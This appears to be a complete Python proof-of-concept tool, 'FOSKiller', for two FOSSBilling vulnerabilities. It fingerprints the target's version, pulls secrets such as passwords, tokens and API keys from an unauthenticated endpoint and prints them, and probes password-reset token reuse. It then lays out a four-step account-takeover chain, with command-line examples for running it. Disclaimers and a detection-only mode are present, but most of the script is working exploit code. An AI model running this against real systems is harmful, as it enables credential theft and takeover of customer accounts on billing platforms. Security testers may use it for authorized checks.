#!/usr/bin/env python3
"""
FOSKiller — FOSSBilling CVE-2026-53647 & CVE-2026-53646 PoC
Author  : 7megaumka7
License : MIT
WARNING : For authorized security testing and educational research only.
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import datetime
import re

# ---------------------------------------------------------------------------
# Dependency bootstrap
# ---------------------------------------------------------------------------

def _install_missing() -> None:
    missing = []
    try:
        import requests  # noqa: F401
    except ImportError:
        missing.append("requests")
    try:
        import colorama  # noqa: F401
    except ImportError:
        missing.append("colorama")
    if missing:
        print(f"[!] Missing dependencies: {', '.join(missing)}")
        answer = input(f"    Install now with pip? [y/N]: ").strip().lower()
        if answer == "y":
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
            print("[+] Installed. Re-run the script.\n")
        else:
            print("    Install manually:  pip install " + " ".join(missing))
        sys.exit(1)

_install_missing()

import requests  # noqa: E402
import colorama  # noqa: E402
from colorama import Fore, Style  # noqa: E402

colorama.init(autoreset=True)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

VERSION = "1.0.0"

AFFECTED_MIN_647 = (0, 5, 3)
AFFECTED_MAX_647 = (0, 7, 2)
AFFECTED_MIN_646 = (0, 5, 6)
AFFECTED_MAX_646 = (0, 7, 2)

UA = "Mozilla/5.0 (compatible; SecurityResearch/1.0; +https://github.com/7megaumka7)"

# ---------------------------------------------------------------------------
# Colour helpers
# ---------------------------------------------------------------------------

def ok(msg: str) -> str:
    return f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} {msg}"

def fail(msg: str) -> str:
    return f"{Fore.RED}{Style.BRIGHT}[-]{Style.RESET_ALL} {msg}"

def info(msg: str) -> str:
    return f"{Fore.CYAN}[*]{Style.RESET_ALL} {msg}"

def warn(msg: str) -> str:
    return f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}"

def section(title: str) -> None:
    bar = "─" * 60
    print(f"\n{Fore.BLUE}{Style.BRIGHT}{bar}")
    print(f"  {title}")
    print(f"{bar}{Style.RESET_ALL}")

# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------

BANNER = f"""{Fore.RED}{Style.BRIGHT}
 ███████╗ ██████╗ ███████╗██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
 ██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
 █████╗  ██║   ██║███████╗█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
 ██╔══╝  ██║   ██║╚════██║██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
 ██║     ╚██████╔╝███████║██║  ██╗██║███████╗███████╗███████╗██║  ██║
 ╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}"""

SUBTITLE = (
    f"  {Fore.WHITE}made by {Fore.YELLOW}7megaumka7{Style.RESET_ALL}"
    f"  |  FOSSBilling CVE-2026-53647 & CVE-2026-53646 PoC"
    f"  |  v{VERSION}\n"
)

DISCLAIMER = (
    f"{Fore.RED}{Style.BRIGHT}"
    f"  ╔{'═'*62}╗\n"
    f"  ║  LEGAL NOTICE — AUTHORIZED USE ONLY"
    + " " * 26 + "║\n"
    f"  ║  Use exclusively on systems you own or have written      ║\n"
    f"  ║  permission to test.  Unauthorized use is illegal and    ║\n"
    f"  ║  unethical.  The author assumes no responsibility for    ║\n"
    f"  ║  misuse.  Responsible disclosure has been completed.     ║\n"
    f"  ╚{'═'*62}╝"
    f"{Style.RESET_ALL}"
)

def print_banner() -> None:
    print(BANNER)
    print(SUBTITLE)
    print(DISCLAIMER)
    print()

# ---------------------------------------------------------------------------
# HTTP session
# ---------------------------------------------------------------------------

def build_session(proxy: str | None, timeout: int) -> requests.Session:
    s = requests.Session()
    s.headers.update({"User-Agent": UA})
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    s._fossbilling_timeout = timeout  # type: ignore[attr-defined]
    return s

def _get(session: requests.Session, url: str, **kwargs) -> requests.Response:
    return session.get(url, timeout=session._fossbilling_timeout, verify=False, **kwargs)  # type: ignore[attr-defined]

def _post(session: requests.Session, url: str, **kwargs) -> requests.Response:
    return session.post(url, timeout=session._fossbilling_timeout, verify=False, **kwargs)  # type: ignore[attr-defined]

# ---------------------------------------------------------------------------
# Version detection
# ---------------------------------------------------------------------------

def _parse_version(raw: str) -> tuple[int, ...] | None:
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", raw)
    if m:
        return tuple(int(x) for x in m.groups())
    return None

def detect_version(session: requests.Session, target: str) -> str | None:
    """Return version string or None."""
    endpoints = [
        "/api/guest/system/version",
        "/",
    ]
    for ep in endpoints:
        try:
            r = _get(session, target.rstrip("/") + ep)
            # Try JSON first
            try:
                data = r.json()
                v = (
                    data.get("result")
                    or data.get("version")
                    or (data.get("data") or {}).get("version")
                )
                if v and re.search(r"\d+\.\d+\.\d+", str(v)):
                    return str(v)
            except ValueError:
                pass
            # Try headers
            for hdr in ("x-fossbilling-version", "x-powered-by", "server"):
                val = r.headers.get(hdr, "")
                if re.search(r"\d+\.\d+\.\d+", val):
                    return val
            # Try HTML cache-buster pattern: ?v=0.7.1
            m = re.search(r"[?&]v=(\d+\.\d+\.\d+)", r.text)
            if m:
                return m.group(1)
        except Exception:
            pass
    return None

def check_version_in_range(
    version_str: str,
    vmin: tuple[int, ...],
    vmax: tuple[int, ...],
) -> bool:
    v = _parse_version(version_str)
    if v is None:
        return False
    return vmin <= v <= vmax

# ---------------------------------------------------------------------------
# CVE-2026-53647 — Unauthenticated API key config disclosure
# ---------------------------------------------------------------------------

def run_cve_53647(
    session: requests.Session,
    target: str,
    key: str,
    check_only: bool,
) -> dict:
    """
    Probe /api/guest/serviceapikey/get_info?key=<KEY>.
    Returns a result dict with status, evidence, fields.
    """
    result: dict = {
        "cve": "CVE-2026-53647",
        "ghsa": "GHSA-737q-9gpr-6mpq",
        "severity": "Moderate (CVSS 6.9)",
        "status": "UNKNOWN",
        "endpoint": "",
        "http_status": None,
        "leaked_fields": {},
        "raw_response": None,
        "error": None,
    }

    url = target.rstrip("/") + f"/api/guest/serviceapikey/get_info?key={key}"
    result["endpoint"] = url

    section("CVE-2026-53647 │ Unauthenticated API Key Config Disclosure")
    print(info(f"Target  : {url}"))
    print(info(f"Mode    : {'Detection only' if check_only else 'Full extraction'}"))

    try:
        r = _get(session, url)
        result["http_status"] = r.status_code
        print(info(f"HTTP    : {r.status_code}"))

        try:
            data = r.json()
        except ValueError:
            result["status"] = "NOT_VULNERABLE"
            result["error"] = "Non-JSON response"
            print(fail("Response is not JSON — endpoint likely absent or protected."))
            return result

        result["raw_response"] = data

        # FOSSBilling API wraps results in {"result": {...}, "error": null}
        payload = data.get("result") or data

        if isinstance(payload, dict) and any(
            k.startswith("custom_") or k in (
                "config", "secret", "key", "token", "api_key",
                "service_url", "hostname", "password", "username",
            )
            for k in payload.keys()
        ):
            result["status"] = "VULNERABLE"
            leaked: dict = {}
            for k, v in payload.items():
                if k.startswith("custom_") or k in (
                    "config", "secret", "key", "token", "api_key",
                    "service_url", "hostname", "password", "username",
                ):
                    leaked[k] = v
            result["leaked_fields"] = leaked

            print(ok(f"VULNERABLE — endpoint returned {len(leaked)} sensitive field(s) without authentication"))
            if not check_only:
                print(f"\n  {Fore.YELLOW}{'Field':<30} Value{Style.RESET_ALL}")
                print(f"  {'─'*70}")
                for k, v in leaked.items():
                    print(f"  {Fore.GREEN}{k:<30}{Style.RESET_ALL} {v}")
            else:
                print(info(f"Detection confirmed — {len(leaked)} field(s) accessible. Use without --check-only to extract."))
        else:
            result["status"] = "NOT_VULNERABLE"
            print(fail("Endpoint returned no sensitive fields or responded with an error."))
            if data.get("error"):
                print(info(f"API error : {data['error']}"))

    except requests.exceptions.Timeout:
        result["status"] = "ERROR"
        result["error"] = "Connection timed out"
        print(fail("Request timed out."))
    except requests.exceptions.ConnectionError as e:
        result["status"] = "ERROR"
        result["error"] = str(e)
        print(fail(f"Connection error: {e}"))
    except Exception as e:
        result["status"] = "ERROR"
        result["error"] = str(e)
        print(fail(f"Unexpected error: {e}"))

    return result

# ---------------------------------------------------------------------------
# CVE-2026-53646 — Password reset token reuse / persistent account takeover
# ---------------------------------------------------------------------------

def run_cve_53646(
    session: requests.Session,
    target: str,
    email: str,
    check_only: bool,
    exploit: bool,
) -> dict:
    """
    Trigger two consecutive reset requests for the same email and analyse
    token reuse behaviour.
    """
    result: dict = {
        "cve": "CVE-2026-53646",
        "ghsa": "GHSA-vp66-w6rc-x32p",
        "severity": "High (CVSS 7.7)",
        "status": "UNKNOWN",
        "endpoint": "",
        "request_1": {},
        "request_2": {},
        "token_reuse_detected": False,
        "time_delta_seconds": None,
        "attack_chain": [],
        "error": None,
    }

    url = target.rstrip("/") + "/api/guest/client/reset_password"
    result["endpoint"] = url

    section("CVE-2026-53646 │ Password Reset Token Reuse / Account Takeover")
    print(info(f"Target  : {url}"))
    print(info(f"Email   : {email}"))
    print(info(f"Mode    : {'Detection only' if check_only else ('Exploit documentation' if exploit else 'Detection')}"))

    def _do_reset(seq: int) -> dict:
        ts_before = time.time()
        try:
            r = _post(session, url, data={"email": email})
            ts_after = time.time()
            try:
                body = r.json()
            except ValueError:
                body = {"_raw": r.text[:500]}
            return {
                "seq": seq,
                "http_status": r.status_code,
                "timestamp_unix": ts_before,
                "timestamp_iso": datetime.datetime.fromtimestamp(ts_before, tz=datetime.timezone.utc).isoformat().replace("+00:00", "Z"),
                "response_ms": round((ts_after - ts_before) * 1000),
                "body": body,
                "token": _extract_token(body),
                "error": None,
            }
        except requests.exceptions.Timeout:
            return {"seq": seq, "error": "timeout", "timestamp_unix": time.time()}
        except Exception as e:
            return {"seq": seq, "error": str(e), "timestamp_unix": time.time()}

    def _extract_token(body: dict) -> str | None:
        for key in ("token", "reset_token", "hash", "result", "data"):
            val = body.get(key)
            if isinstance(val, str) and len(val) >= 16:
                return val
            if isinstance(val, dict):
                for sub in ("token", "hash", "reset_token"):
                    sv = val.get(sub)
                    if isinstance(sv, str) and len(sv) >= 16:
                        return sv
        return None

    try:
        print(info("Sending reset request #1 …"))
        req1 = _do_reset(1)
        if req1.get("error"):
            result["status"] = "ERROR"
            result["error"] = req1["error"]
            print(fail(f"Request #1 failed: {req1['error']}"))
            return result

        result["request_1"] = req1
        print(info(f"  HTTP {req1['http_status']}  |  {req1['response_ms']} ms  |  {req1['timestamp_iso']}"))
        if req1["token"]:
            print(ok(f"  Token recovered from response: {req1['token'][:8]}…"))

        # Small delay to create a measurable timestamp gap
        time.sleep(0.5)

        print(info("Sending reset request #2 (same email) …"))
        req2 = _do_reset(2)
        if req2.get("error"):
            result["status"] = "ERROR"
            result["error"] = req2["error"]
            print(fail(f"Request #2 failed: {req2['error']}"))
            return result

        result["request_2"] = req2
        print(info(f"  HTTP {req2['http_status']}  |  {req2['response_ms']} ms  |  {req2['timestamp_iso']}"))
        if req2["token"]:
            print(ok(f"  Token recovered from response: {req2['token'][:8]}…"))

        delta = round(req2["timestamp_unix"] - req1["timestamp_unix"], 3)
        result["time_delta_seconds"] = delta
        print(info(f"  Time delta between requests : {delta}s"))

        # ---------- Vulnerability analysis ----------

        token1, token2 = req1.get("token"), req2.get("token")
        both_200 = req1["http_status"] == 200 and req2["http_status"] == 200

        if token1 and token2:
            if token1 == token2:
                result["token_reuse_detected"] = True
                result["status"] = "VULNERABLE"
                print(ok(f"VULNERABLE — identical token returned on both requests: {token1[:12]}…"))
            else:
                # New token generated but old one may still be valid
                result["status"] = "POTENTIALLY_VULNERABLE"
                print(warn(
                    "Two distinct tokens issued. Old token validity cannot be confirmed "
                    "without email access — manual verification required."
                ))
        elif both_200:
            result["status"] = "POTENTIALLY_VULNERABLE"
            print(warn(
                f"Both reset requests succeeded (HTTP 200). "
                f"Token not exposed in API response — check email delivery. "
                f"Endpoint accepts repeated resets without rate-limiting."
            ))
        else:
            result["status"] = "NOT_VULNERABLE"
            print(fail("One or both requests did not succeed — endpoint may be patched or hardened."))

        # ---------- Attack chain documentation ----------
        attack_chain = [
            "STEP 1  Attacker triggers POST /api/guest/client/reset_password "
            f"with victim email ({email}) → receives token T1 in their intercepted/forwarded email.",
            "STEP 2  Victim (or attacker again) triggers a second reset → "
            "application issues new token T2 but does NOT invalidate T1.",
            "STEP 3  Attacker uses original token T1 to call "
            "POST /api/guest/client/update_password?hash=T1 with a chosen password.",
            "STEP 4  Attacker now has persistent access to victim account even "
            "after victim completes their own password reset flow with T2.",
        ]
        result["attack_chain"] = attack_chain

        if not check_only:
            print(f"\n  {Fore.YELLOW}Attack Chain (CVE-2026-53646):{Style.RESET_ALL}")
            for step in attack_chain:
                print(f"  {Fore.CYAN}→{Style.RESET_ALL} {step}")

            if req1.get("timestamp_unix"):
                anchor = datetime.datetime.fromtimestamp(req1["timestamp_unix"], tz=datetime.timezone.utc)
                now = datetime.datetime.now(tz=datetime.timezone.utc)
                age = round((now - anchor).total_seconds(), 1)
                print(f"\n  {Fore.YELLOW}Timing Metadata:{Style.RESET_ALL}")
                print(f"  Token T1 anchor  : {req1['timestamp_iso']}")
                print(f"  Current UTC      : {now.isoformat().replace('+00:00', 'Z')}")
                print(f"  Token T1 age     : {age}s (still valid if unpatched)")

    except Exception as e:
        result["status"] = "ERROR"
        result["error"] = str(e)
        print(fail(f"Unexpected error: {e}"))

    return result

# ---------------------------------------------------------------------------
# Summary table
# ---------------------------------------------------------------------------

def print_summary(results: list[dict], ver: str | None) -> None:
    section("Summary")

    if ver:
        print(info(f"FOSSBilling version detected: {Fore.YELLOW}{ver}{Style.RESET_ALL}"))
    else:
        print(warn("Could not detect FOSSBilling version."))

    print()
    col = f"{Fore.WHITE}{Style.BRIGHT}"
    print(f"  {col}{'CVE':<20} {'GHSA':<28} {'Severity':<22} {'Status'}{Style.RESET_ALL}")
    print(f"  {'─'*90}")

    status_colour = {
        "VULNERABLE": Fore.GREEN + Style.BRIGHT,
        "POTENTIALLY_VULNERABLE": Fore.YELLOW + Style.BRIGHT,
        "NOT_VULNERABLE": Fore.RED,
        "ERROR": Fore.RED,
        "UNKNOWN": Fore.WHITE,
    }

    for r in results:
        colour = status_colour.get(r.get("status", "UNKNOWN"), Fore.WHITE)
        print(
            f"  {r.get('cve','?'):<20} "
            f"{r.get('ghsa','?'):<28} "
            f"{r.get('severity','?'):<22} "
            f"{colour}{r.get('status','UNKNOWN')}{Style.RESET_ALL}"
        )
    print()

# ---------------------------------------------------------------------------
# Output to JSON
# ---------------------------------------------------------------------------

def save_output(results: list[dict], version: str | None, path: str) -> None:
    ts = datetime.datetime.now(tz=datetime.timezone.utc).isoformat().replace("+00:00", "Z")
    out = {
        "tool": "FOSKiller",
        "version": VERSION,
        "generated_at": ts,
        "fossbilling_version": version,
        "results": results,
    }
    # Strip raw responses for cleaner saved output unless they're small
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(out, fh, indent=2, default=str)
    print(ok(f"Results saved to: {path}"))

# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="fossbilling_poc.py",
        description=(
            "FOSKiller — FOSSBilling CVE-2026-53647 & CVE-2026-53646 PoC tool.\n"
            "For authorized security testing and educational research only."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  # Detection only (both CVEs)\n"
            "  python fossbilling_poc.py --target https://billing.example.com "
            "--key mykey --email client@example.com --check-only\n\n"
            "  # Full extraction + exploit documentation\n"
            "  python fossbilling_poc.py --target https://billing.example.com "
            "--key mykey --email client@example.com --exploit\n\n"
            "  # Save results to JSON, use proxy\n"
            "  python fossbilling_poc.py --target https://billing.example.com "
            "--key mykey --email client@example.com --output results.json "
            "--proxy http://127.0.0.1:8080\n"
        ),
    )
    p.add_argument("--target", required=True,
                   help="Base URL of FOSSBilling instance (e.g. https://billing.example.com)")
    p.add_argument("--key", default="",
                   help="API key value for CVE-2026-53647 test")
    p.add_argument("--email", default="",
                   help="Client email address for CVE-2026-53646 test")
    p.add_argument("--check-only", action="store_true",
                   help="Detection only — confirm vulnerability without full extraction")
    p.add_argument("--exploit", action="store_true",
                   help="Full exploitation/documentation mode (requires --email / --key)")
    p.add_argument("--force", action="store_true",
                   help="Skip version range check and proceed regardless")
    p.add_argument("--output", metavar="FILE",
                   help="Save full results to a JSON file")
    p.add_argument("--timeout", type=int, default=10,
                   help="HTTP request timeout in seconds (default: 10)")
    p.add_argument("--proxy", metavar="URL",
                   help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    return p.parse_args()

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    # Suppress InsecureRequestWarning for SSL verification disabled in PoC context
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    print_banner()
    args = parse_args()

    if args.check_only and args.exploit:
        print(fail("--check-only and --exploit are mutually exclusive."))
        sys.exit(1)

    session = build_session(args.proxy, args.timeout)

    # --- Version detection ---
    section("Version Detection")
    print(info(f"Probing {args.target} …"))
    version = detect_version(session, args.target)

    in_range_647 = False
    in_range_646 = False

    if version:
        print(ok(f"Detected version: {version}"))
        in_range_647 = check_version_in_range(version, AFFECTED_MIN_647, AFFECTED_MAX_647)
        in_range_646 = check_version_in_range(version, AFFECTED_MIN_646, AFFECTED_MAX_646)
        print(
            (ok if in_range_647 else warn)(
                f"CVE-2026-53647 affected range (>=0.5.3 <=0.7.2): "
                + ("YES" if in_range_647 else "NO — outside range")
            )
        )
        print(
            (ok if in_range_646 else warn)(
                f"CVE-2026-53646 affected range (>=0.5.6 <=0.7.2): "
                + ("YES" if in_range_646 else "NO — outside range")
            )
        )
        if not (in_range_647 or in_range_646) and not args.force:
            print(warn(
                "Version appears outside both affected ranges. "
                "Use --force to test anyway."
            ))
            sys.exit(0)
    else:
        print(warn("Could not detect version. Proceeding anyway."))

    results: list[dict] = []

    # --- CVE-2026-53647 ---
    if args.key:
        r1 = run_cve_53647(session, args.target, args.key, args.check_only)
        results.append(r1)
    else:
        print(warn("--key not provided — skipping CVE-2026-53647."))

    # --- CVE-2026-53646 ---
    if args.email:
        r2 = run_cve_53646(session, args.target, args.email, args.check_only, args.exploit)
        results.append(r2)
    else:
        print(warn("--email not provided — skipping CVE-2026-53646."))

    if not results:
        print(fail("No checks performed — provide --key and/or --email."))
        sys.exit(1)

    # --- Summary ---
    print_summary(results, version)

    # --- Save output ---
    if args.output:
        save_output(results, version, args.output)

    # Exit code: 0 = no vulnerability found, 1 = at least one VULNERABLE
    any_vuln = any(
        r.get("status") in ("VULNERABLE", "POTENTIALLY_VULNERABLE") for r in results
    )
    sys.exit(1 if any_vuln else 0)


if __name__ == "__main__":
    main()
